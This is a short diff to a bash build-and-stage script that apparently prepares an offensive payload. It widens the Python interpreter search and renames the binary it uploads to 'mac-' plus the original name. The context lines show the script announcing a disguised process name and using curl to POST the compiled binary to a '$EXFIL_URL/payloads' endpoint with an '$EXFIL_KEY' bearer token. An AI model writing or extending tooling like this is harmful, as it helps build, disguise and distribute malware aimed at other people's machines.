@@ -158,7 +158,7 @@ echo "    Process name in ps: $BINARY_NAME"
 
 # ── Check Python ──────────────────────────────────────────────────────────────
 PYTHON=""
-for candidate in python3.13 python3.12 python3.11 python3.10 python3; do
+for candidate in python3.13 python3.12 python3.11 python3.10 python3 python; do
     if command -v "$candidate" &>/dev/null; then
         ver=$("$candidate" -c 'import sys; print(sys.version_info.major * 10 + sys.version_info.minor)' 2>/dev/null) || continue
         if (( ver >= 310 )); then
@@ -236,7 +236,7 @@ if [[ "$UPLOAD" == "1" ]]; then
     HTTP_STATUS=$(curl -s -o /tmp/bb_upload_resp.txt -w "%{http_code}" \
         -X POST "$EXFIL_URL/payloads" \
         -H "Authorization: Bearer $EXFIL_KEY" \
-        -F "file=@$SCRIPT_DIR/$BINARY_NAME;filename=$BINARY_NAME")
+        -F "file=@$SCRIPT_DIR/$BINARY_NAME;filename=mac-$BINARY_NAME")
     if [[ "$HTTP_STATUS" =~ ^[23] ]]; then
         echo "[+] Uploaded: $EXFIL_URL/payloads/$BINARY_NAME"
     else
